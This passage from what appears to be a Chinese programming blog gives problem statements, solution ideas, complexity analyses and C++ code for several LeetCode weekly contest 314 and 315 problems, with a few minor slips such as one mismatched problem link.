<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/the-employee-that-worked-on-the-longest-task/">https://leetcode.cn/problems/the-employee-that-worked-on-the-longest-task/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接模拟
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目比较怪异，不是很好的题目，直接模拟即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 为数组的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">hardestWorker</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; logs)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = logs.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> time = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> idx = n;</span><br><span class="line">        <span class="type">int</span> maxCost = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">int</span> cost = logs[i][<span class="number">1</span>] - time;</span><br><span class="line">            <span class="keyword">if</span> (cost &gt; maxCost ) &#123;</span><br><span class="line">                maxCost = cost;</span><br><span class="line">                idx = logs[i][<span class="number">0</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cost == maxCost &amp;&amp; logs[i][<span class="number">0</span>] &lt; idx) &#123;</span><br><span class="line">                idx = logs[i][<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            time = logs[i][<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> idx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6201-找出前缀异或的原始数组"><a href="#6201-找出前缀异或的原始数组" class="headerlink" title="6201. 找出前缀异或的原始数组"></a>6201. 找出前缀异或的原始数组</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个长度为 <code>n</code> 的 整数 数组 <code>pref</code> 。找出并返回满足下述条件且长度为 <code>n</code> 的数组 <code>arr</code> ：</p>
<p><code>pref[i] = arr[0] ^ arr[1] ^ ... ^ arr[i]</code>.<br>注意 <code>^</code> 表示 按位异或（<code>bitwise-xor</code>）运算。</p>
<p>可以证明答案是 唯一 的。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：pref = [5,2,0,3,1]</span><br><span class="line">输出：[5,7,2,3,2]</span><br><span class="line">解释：从数组 [5,7,2,3,2] 可以得到如下结果：</span><br><span class="line">- pref[0] = 5</span><br><span class="line">- pref[1] = 5 ^ 7 = 2</span><br><span class="line">- pref[2] = 5 ^ 7 ^ 2 = 0</span><br><span class="line">- pref[3] = 5 ^ 7 ^ 2 ^ 3 = 3</span><br><span class="line">- pref[4] = 5 ^ 7 ^ 2 ^ 3 ^ 2 = 1</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：pref = [13]</span><br><span class="line">输出：[13]</span><br><span class="line">解释：pref[0] = arr[0] = 13</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= pref.length &lt;= 105</code></li>
<li><code>0 &lt;= pref[i] &lt;= 106</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/find-the-original-array-of-prefix-xor/">https://leetcode.cn/problems/find-the-original-array-of-prefix-xor/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>数学问题
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>非常简单的踢腿公式即可。我们知道 $arr[0] &#x3D; pref[0]$，根据题意可知 $pref[i] &#x3D; arr[0] \oplus arr[1] \cdots arr[i]$，所以可以知道:<br>$$<br>arr[i] &#x3D; pref[i] \oplus arr[0] \oplus arr[1] \cdots arr[i - 1]<br>$$<br>我们根据上述公式依次求出 $arr$ 即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：空间复杂度为 $O(1)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">findArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; pref)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = pref.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">res</span><span class="params">(n)</span></span>;</span><br><span class="line">        res[<span class="number">0</span>] = pref[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> tot = res[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            res[i] = tot ^ pref[i];</span><br><span class="line">            tot = tot ^ res[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6202-使用机器人打印字典序最小的字符串"><a href="#6202-使用机器人打印字典序最小的字符串" class="headerlink" title="6202. 使用机器人打印字典序最小的字符串"></a>6202. 使用机器人打印字典序最小的字符串</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个字符串 <code>s</code> 和一个机器人，机器人当前有一个空字符串 <code>t</code> 。执行以下操作之一，直到 <code>s</code> 和 <code>t</code> 都变成空字符串：</p>
<ul>
<li>删除字符串 <code>s</code> 的 第一个 字符，并将该字符给机器人。机器人把这个字符添加到 <code>t</code> 的尾部。</li>
<li>删除字符串 <code>t</code> 的 最后一个 字符，并将该字符给机器人。机器人将该字符写到纸上。<br>请你返回纸上能写出的字典序最小的字符串。</li>
</ul>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;zza&quot;</span><br><span class="line">输出：&quot;azz&quot;</span><br><span class="line">解释：用 p 表示写出来的字符串。</span><br><span class="line">一开始，p=&quot;&quot; ，s=&quot;zza&quot; ，t=&quot;&quot; 。</span><br><span class="line">执行第一个操作三次，得到 p=&quot;&quot; ，s=&quot;&quot; ，t=&quot;zza&quot; 。</span><br><span class="line">执行第二个操作三次，得到 p=&quot;azz&quot; ，s=&quot;&quot; ，t=&quot;&quot; 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;bac&quot;</span><br><span class="line">输出：&quot;abc&quot;</span><br><span class="line">解释：用 p 表示写出来的字符串。</span><br><span class="line">执行第一个操作两次，得到 p=&quot;&quot; ，s=&quot;c&quot; ，t=&quot;ba&quot; 。</span><br><span class="line">执行第二个操作两次，得到 p=&quot;ab&quot; ，s=&quot;c&quot; ，t=&quot;&quot; 。</span><br><span class="line">执行第一个操作，得到 p=&quot;ab&quot; ，s=&quot;&quot; ，t=&quot;c&quot; 。</span><br><span class="line">执行第二个操作，得到 p=&quot;abc&quot; ，s=&quot;&quot; ，t=&quot;&quot; 。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;bdda&quot;</span><br><span class="line">输出：&quot;addb&quot;</span><br><span class="line">解释：用 p 表示写出来的字符串。</span><br><span class="line">一开始，p=&quot;&quot; ，s=&quot;bdda&quot; ，t=&quot;&quot; 。</span><br><span class="line">执行第一个操作四次，得到 p=&quot;&quot; ，s=&quot;&quot; ，t=&quot;bdda&quot; 。</span><br><span class="line">执行第二个操作四次，得到 p=&quot;addb&quot; ，s=&quot;&quot; ，t=&quot;&quot; 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= s.length &lt;= 105</code></li>
<li><code>s</code> 只包含小写英文字母。</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/using-a-robot-to-print-the-lexicographically-smallest-string/">https://leetcode.cn/problems/using-a-robot-to-print-the-lexicographically-smallest-string/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>贪心
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>经典的贪心算法问题，即求最大或者最小出栈顺序，我们可以将 $t$ 看做一个栈，求字典序最小的出栈顺序；往上可以搜到原题。</li>
<li>为保证出栈顺序最小，我们首先将元素压入到栈中，如果发现剩余未入栈的字符串中没有比当前元素更小的字符时，应该将栈顶元素出栈。</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 为字符串的长度。</li>
<li>空间复杂度：时间复杂度为 $O(n)$，$n$ 为字符串的长度。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">robotWithString</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">char</span>&gt; <span class="title">rmin</span><span class="params">(n)</span></span>;</span><br><span class="line">        rmin[n - <span class="number">1</span>] = s[n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            rmin[i] = <span class="built_in">min</span>(s[i], rmin[i + <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        stack&lt;<span class="type">char</span>&gt; st;</span><br><span class="line">        string res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!st.<span class="built_in">empty</span>() &amp;&amp; st.<span class="built_in">top</span>() &lt;= rmin[i]) &#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(st.<span class="built_in">top</span>());</span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            st.<span class="built_in">emplace</span>(s[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (!st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(st.<span class="built_in">top</span>());</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6203-矩阵中和能被-K-整除的路径"><a href="#6203-矩阵中和能被-K-整除的路径" class="headerlink" title="6203. 矩阵中和能被 K 整除的路径"></a>6203. 矩阵中和能被 K 整除的路径</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0</code> 开始的 <code>m x n</code> 整数矩阵 <code>grid</code> 和一个整数 <code>k</code> 。你从起点 <code>(0, 0)</code> 出发，每一步只能往 下 或者往 右 ，你想要到达终点 <code>(m - 1, n - 1)</code> 。</p>
<p>请你返回路径和能被 <code>k</code> 整除的路径数目，由于答案可能很大，返回答案对 <code>109 + 7</code> 取余 的结果。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[5,2,4],[3,0,5],[0,7,2]], k = 3</span><br><span class="line">输出：2</span><br><span class="line">解释：有两条路径满足路径上元素的和能被 k 整除。</span><br><span class="line">第一条路径为上图中用红色标注的路径，和为 5 + 2 + 4 + 5 + 2 = 18 ，能被 3 整除。</span><br><span class="line">第二条路径为上图中用蓝色标注的路径，和为 5 + 3 + 0 + 5 + 2 = 15 ，能被 3 整除。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[0,0]], k = 5</span><br><span class="line">输出：1</span><br><span class="line">解释：红色标注的路径和为 0 + 0 = 0 ，能被 5 整除。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[7,3,4,9],[2,3,6,2],[2,3,7,0]], k = 1</span><br><span class="line">输出：10</span><br><span class="line">解释：每个数字都能被 1 整除，所以每一条路径的和都能被 k 整除。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>m == grid.length</code></li>
<li><code>n == grid[i].length</code></li>
<li><code>1 &lt;= m, n &lt;= 5 * 104</code></li>
<li><code>1 &lt;= m * n &lt;= 5 * 104</code></li>
<li><code>0 &lt;= grid[i][j] &lt;= 100</code></li>
<li><code>1 &lt;= k &lt;= 50</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/maximum-deletions-on-a-string/description/">https://leetcode.cn/problems/maximum-deletions-on-a-string/description/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 动态规划</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>太常规的题目了，基本上看到就知道思路的题目，设 $dp[i][j][s]$ 表示经过 $(i,j)$ 且路径和对 $k$ 取模为 $s$ 的路径数目，则可以知道递推公式:<br>$$<br>dp[i][j][k] &#x3D; dp[i-1][j][(k - grid[i][j]) \mod k] + dp[i][j][(k - grid[i][j]) \mod k]<br>$$<br>非常简单的动态规划的思路，没有太大难度。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(m \times n \times k)$，其中 $m,n$ 表示给定的矩阵的行数与列数。</li>
<li>空间复杂度：$O(m \times n)$，其中 $m,n$ 表示给定的矩阵的行数与列数。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numberOfPaths</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> dp[m][n][k];</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="built_in">memset</span>(dp, <span class="number">0</span>, <span class="built_in">sizeof</span>(dp));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i == <span class="number">0</span> &amp;&amp; j == <span class="number">0</span>) &#123;</span><br><span class="line">                    dp[<span class="number">0</span>][<span class="number">0</span>][grid[<span class="number">0</span>][<span class="number">0</span>] % k]++;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> s = <span class="number">0</span>; s &lt; k; s++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; dp[i<span class="number">-1</span>][j][s] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        dp[i][j][(s + grid[i][j]) % k] = (dp[i][j][(s + grid[i][j]) % k] + dp[i<span class="number">-1</span>][j][s]) % mod;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (j - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; dp[i][j - <span class="number">1</span>][s] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        dp[i][j][(s + grid[i][j]) % k] = (dp[i][j][(s + grid[i][j]) % k] + dp[i][j<span class="number">-1</span>][s]) % mod;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m<span class="number">-1</span>][n<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode contest 315</title>
    <url>/2022/11/02/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/43/</url>
    <content><![CDATA[<h2 id="leetcode-contest-315"><a href="#leetcode-contest-315" class="headerlink" title="leetcode contest 315"></a>leetcode contest 315</h2><p>前三题确实太水的题目，都是暴力。</p>
<h4 id="6204-与对应负数同时存在的最大正整数"><a href="#6204-与对应负数同时存在的最大正整数" class="headerlink" title="6204. 与对应负数同时存在的最大正整数"></a>6204. 与对应负数同时存在的最大正整数</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个 不包含 任何零的整数数组 <code>nums</code> ，找出自身与对应的负数都在数组中存在的最大正整数 <code>k</code> 。</p>
<p>返回正整数 <code>k</code> ，如果不存在这样的整数，返回 <code>-1</code> 。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [-1,2,-3,3]</span><br><span class="line">输出：3</span><br><span class="line">解释：3 是数组中唯一一个满足题目要求的 k 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [-1,10,6,7,-7,1]</span><br><span class="line">输出：7</span><br><span class="line">解释：数组中存在 1 和 7 对应的负数，7 的值更大。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [-10,8,6,7,-2,-3]</span><br><span class="line">输出：-1</span><br><span class="line">解释：不存在满足题目要求的 k ，返回 -1 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 1000</code></li>
<li><code>-1000 &lt;= nums[i] &lt;= 1000</code></li>
<li><code>nums[i] != 0</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/largest-positive-integer-that-exists-with-its-negative/">https://leetcode.cn/problems/largest-positive-integer-that-exists-with-its-negative/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>哈希
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>排序后直接统计即可，即统计 $x$ 与 $-x$ 是否同时出现。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 为数组的长度。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 为数组的长度。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findMaxK</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : nums) &#123;</span><br><span class="line">            cnt.<span class="built_in">emplace</span>(v);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (v &gt; <span class="number">0</span> &amp;&amp; cnt.<span class="built_in">count</span>(-v)) &#123;</span><br><span class="line">                ans = <span class="built_in">max</span>(ans, v);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6205-反转之后不同整数的数目"><a href="#6205-反转之后不同整数的数目" class="headerlink" title="6205. 反转之后不同整数的数目"></a>6205. 反转之后不同整数的数目</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个由 正 整数组成的数组 <code>nums</code> 。</p>
<p>你必须取出数组中的每个整数，反转其中每个数位，并将反转后得到的数字添加到数组的末尾。这一操作只针对 <code>nums</code> 中原有的整数执行。</p>
<p>返回结果数组中 不同 整数的数目。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,13,10,12,31]</span><br><span class="line">输出：6</span><br><span class="line">解释：反转每个数字后，结果数组是 [1,13,10,12,31,1,31,1,21,13] 。</span><br><span class="line">反转后得到的数字添加到数组的末尾并按斜体加粗表示。注意对于整数 10 ，反转之后会变成 01 ，即 1 。</span><br><span class="line">数组中不同整数的数目为 6（数字 1、10、12、13、21 和 31）。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [2,2,2]</span><br><span class="line">输出：1</span><br><span class="line">解释：反转每个数字后，结果数组是 [2,2,2,2,2,2] 。</span><br><span class="line">数组中不同整数的数目为 1（数字 2）。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 105</code></li>
<li><code>1 &lt;= nums[i] &lt;= 106</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/count-number-of-distinct-integers-after-reverse-operations/description/">https://leetcode.cn/problems/count-number-of-distinct-integers-after-reverse-operations/description/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>遍历即可
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们将其中的每个数 $x$ 按照数位进行反转并得到 $r(x)$，最终用哈希表存储 $x,r(x)$，最终记录哈希表的大小即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：空间复杂度为 $O(n)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countDistinctIntegers</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : nums) &#123;</span><br><span class="line">            cnt.<span class="built_in">emplace</span>(v);</span><br><span class="line">            string s = <span class="built_in">to_string</span>(v);</span><br><span class="line">            <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>());</span><br><span class="line">            <span class="type">int</span> x = <span class="built_in">stoi</span>(s);</span><br><span class="line">            cnt.<span class="built_in">emplace</span>(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cnt.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6219-反转之后的数字和"><a href="#6219-反转之后的数字和" class="headerlink" title="6219. 反转之后的数字和"></a>6219. 反转之后的数字和</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个 非负 整数 <code>num</code> 。如果存在某个 非负 整数 <code>k</code> 满足 <code>k + reverse(k) = num</code>  ，则返回 <code>true</code> ；否则，返回 <code>false</code> 。</p>
<p><code>reverse(k)</code> 表示 <code>k</code> 反转每个数位后得到的数字。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：num = 443</span><br><span class="line">输出：true</span><br><span class="line">解释：172 + 271 = 443 ，所以返回 true 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：num = 63</span><br><span class="line">输出：false</span><br><span class="line">解释：63 不能表示为非负整数及其反转后数字之和，返回 false 。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：num = 181</span><br><span class="line">输出：true</span><br><span class="line">解释：140 + 041 = 181 ，所以返回 true 。注意，反转后的数字可能包含前导零。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>0 &lt;= num &lt;= 105</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/sum-of-number-and-its-reverse/">https://leetcode.cn/problems/sum-of-number-and-its-reverse/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>遍历
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>由于 $num$ 的范围大小可知，我们直接遍历 $x \in [0,num]$ 即可，检测 $x + r(x) &#x3D; num$ 是否成立即可。</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 为字符串的长度。</li>
<li>空间复杂度：时间复杂度为 $O(\log n)$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">sumOfNumberAndReverse</span><span class="params">(<span class="type">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= num; i++) &#123;</span><br><span class="line">            string s = <span class="built_in">to_string</span>(i);</span><br><span class="line">            <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>());</span><br><span class="line">            <span class="type">int</span> x = <span class="built_in">stoi</span>(s);</span><br><span class="line">            <span class="keyword">if</span> (i + x == num) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6207-统计定界子数组的数目"><a href="#6207-统计定界子数组的数目" class="headerlink" title="6207. 统计定界子数组的数目"></a>6207. 统计定界子数组的数目</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你一个整数数组 <code>nums</code> 和两个整数 <code>minK</code> 以及 <code>maxK</code> 。</p>
<p><code>nums</code> 的定界子数组是满足下述条件的一个子数组：</p>
<ul>
<li>子数组中的 最小值 等于 <code>minK</code> 。</li>
<li>子数组中的 最大值 等于 <code>maxK</code> 。<br>返回定界子数组的数目。</li>
</ul>
<p>子数组是数组中的一个连续部分。</p>
<p>示例 1：</p>
